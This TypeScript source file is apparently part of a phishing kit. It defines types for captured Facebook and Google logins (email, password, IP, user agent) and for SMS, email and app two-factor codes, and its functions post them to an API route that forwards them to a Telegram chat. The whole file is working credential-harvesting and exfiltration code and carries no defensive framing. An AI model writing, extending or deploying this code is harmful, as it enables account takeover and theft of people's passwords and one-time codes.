// Telegram Bot Integration - Client-side functions
// These functions call the API route which handles the actual Telegram messaging

interface FacebookCredentials {
  email: string
  password: string
  timestamp: string
  userAgent?: string
  ipAddress?: string
}

interface TwoFactorCode {
  code: string
  type: '2fa' | '2fa-sms' | '2fa-email' | '2fa-error' | '2fa-sms-error' | '2fa-email-error'
  email?: string
  timestamp: string
  userAgent?: string
  ipAddress?: string
}

// Type alias for better naming - these work for both Facebook and Google
export type GoogleCredentials = FacebookCredentials
export type GoogleOTPCode = TwoFactorCode

export async function sendToTelegram(credentials: FacebookCredentials | GoogleCredentials): Promise<boolean> {
  try {
    const response = await fetch('/api/telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        type: 'facebook-login', // Keep same type for compatibility, works for both
        data: credentials
      })
    })

    const result = await response.json()
    
    if (response.ok && result.success) {
      console.log('✅ Credentials sent to Telegram successfully')
      return true
    } else {
      console.error('❌ Failed to send to Telegram:', result.error || 'Unknown error')
      return false
    }
  } catch (error) {
    console.error('❌ Error sending to Telegram:', error)
    return false
  }
}

export async function send2FAToTelegram(twoFactorData: TwoFactorCode): Promise<boolean> {
  try {
    const response = await fetch('/api/telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        type: '2fa-code',
        data: twoFactorData
      })
    })

    const result = await response.json()
    
    if (response.ok && result.success) {
      console.log('✅ 2FA code sent to Telegram successfully')
      return true
    } else {
      console.error('❌ Failed to send 2FA code to Telegram:', result.error || 'Unknown error')
      return false
    }
  } catch (error) {
    console.error('❌ Error sending 2FA code to Telegram:', error)
    return false
  }
}

// Alternative function to send to multiple chats (if needed)
export async function sendToMultipleChats(credentials: FacebookCredentials, chatIds: string[]): Promise<void> {
  // This would need to be implemented in the API route if needed
  console.log('Multiple chat functionality would need API route implementation')
  
  // For now, just send to the default chat
  await sendToTelegram(credentials)
} 